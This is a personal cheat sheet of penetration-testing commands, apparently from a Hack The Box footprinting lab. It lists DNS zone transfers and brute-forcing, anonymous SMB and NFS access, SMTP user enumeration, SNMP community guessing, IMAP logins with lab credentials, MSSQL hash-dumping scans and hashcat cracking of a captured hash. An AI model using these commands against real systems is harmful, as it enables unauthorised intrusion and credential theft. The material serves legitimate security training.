$ xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248

DNS ENUM

bruteforce for fqdn

dnsenum --dnsserver 10.129.42.195 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/namelist.txt dev.inlanefreight.htb

dig AXFR internal.inlanefreight.htb @STMIP


dig AXFR internal.inlanefreight.htb @STMIP

sudo sh -c 'echo "STMIP internal.inlanefreight.htb" >> /etc/hosts'

dnsenum --dnsserver STMIP --enum -p 0 -s 0 -f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt internal.inlanefreight.htb

sudo sh -c 'echo "STMIP ftp.internal.inlanefreight.htb" >> /etc/hosts'
nmap -T4 ftp.internal.inlanefreight.htb

ftp ftp.internal.inlanefreight.htb 2121

ssh -i id_rsa ceil@STMIP

dig ANY inlanefreight.htb @STMIP

SMB:

smbclient -N -L //10.129.14.128
smbclient //10.129.14.128/notes
smb: \> get prep-prod.txt

rpcclient -U "" 10.129.14.128

Samrdump.py /SMBmap

NFS

$ sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049

showmount -e 10.129.14.128

$ mkdir target-NFS
$ sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
$ cd target-NFS
$ tree .

SMTP

$ telnet 10.129.14.128 25
VRFY root
$ sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v

wget https://academy.hackthebox.com/storage/resources/Footprinting-wordlist.zip

smtp-
smtp-user-enum -M VRFY -U ./footprinting-wordlist.txt -t STMIP -m 60 -w 20

snmp-
onesixtyone -c /opt/useful/SecLists/Discovery/SNMP/snmp.txt 10.129.14.128
snmpwalk -v2c -c public(community string from onesixtyone) 10.129.14.128

curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v

telnet STMIP 110

imap 
openssl s_client -connect 10.129.111.82:imaps
tag0 LOGIN robin robin
tag1 LIST "" "*"
tag2 SELECT "DEV.DEPARTMENT.INT"
tag3 FETCH 1 (BODY[])

mysql:

mysql -u <user> -p<password> -h <IP address>

sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248

$ python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth

hashcat -m 7300 -w 3 -O "93c887ae8200000052f17511d0fd3b9a08350b045e118a2cd0c311777576080bc13a5581d522cdb5a123456789abcdefa123456789abcdef140561646d696e:3541221bac8d7e76f34e45697aed40edfbe87fd8" /usr/share/wordlists/rockyou.txt

